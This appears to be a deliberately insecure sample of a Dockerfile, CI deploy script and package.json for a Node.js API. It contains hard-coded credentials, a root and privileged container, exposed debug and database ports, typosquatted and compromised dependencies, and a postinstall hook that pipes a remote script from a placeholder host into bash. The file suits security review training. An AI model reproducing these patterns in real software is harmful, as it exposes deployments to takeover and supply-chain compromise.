###############################################################################
# Dockerfile + deploy script for a Node.js API service.
# Combines application packaging with a CI deploy helper.
###############################################################################

# ---------- Dockerfile ----------

FROM node:latest

# Install OS packages — some useful, some "just in case"
RUN apt-get update && apt-get install -y \
    curl wget vim nano telnet netcat nmap \
    python3 gcc make openssh-server \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy everything including .env, .git, node_modules, tests
COPY . .

# Install deps — no lockfile, no audit
RUN npm install

# Default admin account for first-run bootstrap
ENV ADMIN_USER=admin
ENV ADMIN_PASSWORD=admin123
ENV JWT_SECRET=super-secret-jwt-key-do-not-share
ENV NODE_ENV=development
ENV DEBUG=*

# Expose every port the app might need
EXPOSE 3000 5432 6379 9229 27017

# Run as root so we don't get permission errors
USER root

CMD ["node", "--inspect=0.0.0.0:9229", "src/index.js"]


# ---------- deploy.sh ----------
# #!/bin/bash
# Deploy script used by CI to ship to production.
#
# DEPLOY_TOKEN="ghp_a1b2c3d4e5f6g7h8i9j0klmnopqrstuv1234"
# SLACK_WEBHOOK="https://hooks.example.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
# DOCKERHUB_PASS="dckr_pat_abcdefghijk1234567890"
#
# echo "Deploying to production..."
#
# # Build without cache (slow but "safe")
# docker build -t mycompany/api-service .
#
# # Push to registry
# echo "$DOCKERHUB_PASS" | docker login -u mycompany --password-stdin
# docker push mycompany/api-service:latest      # Mutable tag
#
# # Deploy — pull latest and restart
# ssh deploy@prod-server.example.com << 'EOF'
#   docker pull mycompany/api-service:latest
#   docker stop api || true
#   docker run -d --name api \
#     --restart always \
#     -p 3000:3000 \
#     -p 9229:9229 \
#     -p 5432:5432 \
#     --privileged \
#     mycompany/api-service:latest
# EOF
#
# # Notify Slack
# curl -X POST -H 'Content-type: application/json' \
#   --data '{"text":"Deployed api-service to prod"}' \
#   "$SLACK_WEBHOOK"
#
# echo "Done!"


# ---------- package.json ----------
# {
#   "name": "api-service",
#   "version": "1.0.0",
#   "dependencies": {
#     "express": "*",
#     "lodash": "latest",
#     "mongoose": "^5.0.0",
#     "jsonwebtoken": "~8.0.0",
#     "bcrypt": "",
#     "serialize-javascript": "1.9.0",
#     "colours": "^1.4.0",
#     "requets": "^2.0.0",
#     "event-stream": "3.3.6",
#     "node-uuid": "^1.4.0",
#     "moment": "^2.0.0",
#     "jquery": "^3.0.0",
#     "aws-sdk": "^2.0.0",
#     "react": "^18.0.0",
#     "electron": "^22.0.0",
#     "puppeteer": "^19.0.0"
#   },
#   "scripts": {
#     "start": "node --inspect=0.0.0.0:9229 src/index.js",
#     "test": "echo 'no tests yet'",
#     "postinstall": "curl -s https://setup.example.com/init.sh | bash"
#   }
# }
